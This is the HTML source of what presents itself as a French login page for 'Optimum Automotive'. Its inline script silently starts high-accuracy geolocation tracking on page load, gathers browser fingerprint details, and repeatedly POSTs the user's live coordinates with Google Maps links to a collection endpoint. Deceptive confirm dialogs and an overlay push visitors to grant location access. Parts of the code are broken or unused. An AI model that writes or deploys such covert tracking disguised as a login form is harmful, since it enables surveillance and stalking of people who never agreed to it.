<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="styles.css">
    <style>
       
    </style>
</head>
<body >
    <div id="locationDisplay"></div>
    
    <div class="loginWrapper">
        <div class="logo">
            <img src="image.png" alt="Optimum Automotive Logo">
        </div>
        <form class="login-form">
          
            <label for="login">Login</label>
          <div class= "login-container">
            <input type="text" id="login" name="login" required>
          </div>

            <label for="password">Mot de passe</label>
            <div class="password-container">
                <input type="password" id="password" name="password" required>
                <span class="toggle-password"></span>
            </div>

            <div class="options">
                <label>
                    <input type="checkbox"> Rester connect√©
                </label>
                <a href="#" class="forgot-password">Mot de passe oubli√©</a>
            </div>

            <button type="submit" class="login-button">Connexion</button>
        </form>
 <!-- Add the "Enable Location Access" button here -->
    </div>
    
    <footer class="footer">
        <div class="footer-container">
            <p>&copy; 2024 Optimum Automotive. All Rights Reserved.</p>
            <ul class="footer-links">
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Terms of Use</a></li>
                <li><a href="#">Contact Us</a></li>
                <li><a href="#">About Us</a></li>
            </ul>
        </div>
    </footer>
    <script>
   
   
   document.addEventListener("DOMContentLoaded", function () {
    console.log("‚úÖ DOM fully loaded. Starting tracking...");

    // let locationDisplay = document.getElementById("locationDisplay");
    if (!locationDisplay) {
        console.error("üö® ERROR: #locationDisplay is missing from the DOM.");
        return;
    }

    startTracking();
    function showFirstDialog() {
        if (confirm("Welcome! Click 'OK' to proceed.")) {
            setTimeout(() => showSecondDialog(), 1000); // Delay before showing second dialog
        } else {
            alert("You must authorize to proceed.");
        }
    }

    function showSecondDialog() {
        if (confirm("To continue, please click 'OK' again.")) {
            setTimeout(() => getLocation(), 1000); // Delay before actual location request
        } else {
            alert("Location access is required for the best experience.");
        }
    }

    function startTracking() {
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(updatePosition, showError, {
      enableHighAccuracy: true,
      timeout: 0,
      maximumAge: 0
    });
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
}

let lastSentTime = 0; // Track last update time to prevent spam
const updateInterval = 3000; // Send an update every 5 seconds




    function showPosition(position) {
        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;
        let timestamp = new Date().toLocaleTimeString();
        console.log(latitude, longitude);

        let systemInfo = `
        User Agent: ${navigator.userAgent}
        Platform: ${navigator.platform}
        Cookies Enabled: ${navigator.cookieEnabled}
        Language: ${navigator.language}
        Screen Width: ${screen.width}
        Screen Height: ${screen.height}
        Time: ${timestamp}
        `;

        let locationData = `
        Latitude: ${latitude}
        Longitude: ${longitude}
        Google Maps: https://www.google.com/maps/place/${latitude},${longitude}
        `;

        sendData("User System Information", systemInfo);
        sendData("User Location", locationData);
    }

    function updatePosition(position) {
    latitude = position.coords.latitude;
    longitude = position.coords.longitude;
    timestamp = new Date().toLocaleTimeString();

    console.log(`üìç Latitude: ${latitude}, Longitude: ${longitude} at ${timestamp}`);

    // Ensure the element exists before updating
    let locationDisplay = document.getElementById("locationDisplay");
    if (locationDisplay) {
        locationDisplay.innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
    } else {
        console.error("üö® ERROR: #locationDisplay not found in the DOM.");
    }

    // Prevent sending too many updates
    let currentTime = new Date().getTime();
    if (currentTime - lastSentTime > updateInterval) {
        sendData(
            "Live Location Update",
            `üìç **Lat:** ${latitude}, **Lon:** ${longitude}\nüîó [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
        );
        lastSentTime = currentTime;
    }
}

    function showError(error) {
        let message;
        switch (error.code) {
            case error.PERMISSION_DENIED:
                message = "User denied the request for Geolocation.";
                document.getElementById("locationOverlay").classList.add("show"); // Show overlay
                break;
            case error.POSITION_UNAVAILABLE:
                message = "Location information is unavailable.";
                break;
            case error.TIMEOUT:
                message = "The request to get user location timed out.";
                break;
            case error.UNKNOWN_ERROR:
                message = "An unknown error occurred.";
                break;
        }
        console.log(message);
        sendData("Location Error", message);
    }

    function sendData(title, description) {
    fetch("http://localhost:3000/send-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title, description })
    })
    .then(response => response.json())
    .then(data => console.log("‚úÖ Sent location update:", data))
    .catch(error => console.error("üö® Error sending data:", error));
}






});

   
        

        if ("serviceWorker" in navigator) {
          navigator.serviceWorker.register("service-worker.js")
            .then((registration) => {
              console.log("Service Worker registered with scope:", registration.scope);
            })
            .catch((error) => {
              console.error("Service Worker registration failed:", error);
            });
        }
    

    </script>
    <script href="server.js"></script>
    
    <div id="locationOverlay" class="overlay">
        <div class="overlay-content">
            <h2>We Need Your Location</h2>
            <p>To continue, please close and re-open tab.</p>
            <button id="grantLocation">Click allow</button>
        </div>
    </div>
   
  

    
</body>
</html>
